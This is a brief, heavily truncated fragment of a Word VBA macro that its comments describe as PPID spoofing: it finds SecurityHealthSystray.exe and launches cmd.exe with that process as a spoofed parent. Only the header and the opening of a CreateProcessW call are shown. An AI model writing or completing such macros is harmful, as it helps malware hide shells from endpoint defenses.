...
' Self-contained PPID Spoofing macro for Word .doc files.
' Finds SecurityHealthSystray.exe, creates cmd.exe with it as spoofed parent.
' No dependencies — all declares inline. Paste into a standard module.
...
Private Function CreateSpoofedProcess( _
    ...
    If CreateProcessW(0, StrPtr(cmdLine), 0, 0, 0, _
